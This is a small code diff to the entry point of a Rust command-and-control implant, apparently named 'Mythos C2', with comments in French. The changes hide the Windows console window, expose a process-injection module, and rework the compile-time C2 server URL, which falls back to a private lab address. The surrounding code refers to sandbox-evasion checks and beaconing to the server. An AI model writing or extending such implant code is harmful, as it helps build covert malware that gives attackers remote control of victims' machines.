@@ -1,3 +1,4 @@
+#![windows_subsystem = "windows"]
 // Mythos C2 — Agent
 //
 // Point d'entrée de l'implant. Ce fichier orchestre :
@@ -13,6 +14,7 @@ mod crypto;
 mod transport;
 mod evasion;
 mod commands;
+pub mod inject;
 
 use transport::{BeaconData, RegisterRequest, Session};
 use evasion::check_environment;
@@ -23,7 +25,10 @@ use evasion::check_environment;
 
 // URL du C2 — injectée à la compilation
 // Usage : C2_URL=https://192.168.249.100:8080 cargo build --release
-const C2_URL: &str = env!("C2_URL", "http://192.168.249.100:8080");
+const C2_URL: &str = match option_env!("C2_URL") {
+    Some(url) => url,
+    None => "http://192.168.249.100:8080",
+};
 
 // Intervalle beacon par défaut (override par le serveur)
 const DEFAULT_SLEEP: u64 = 60;
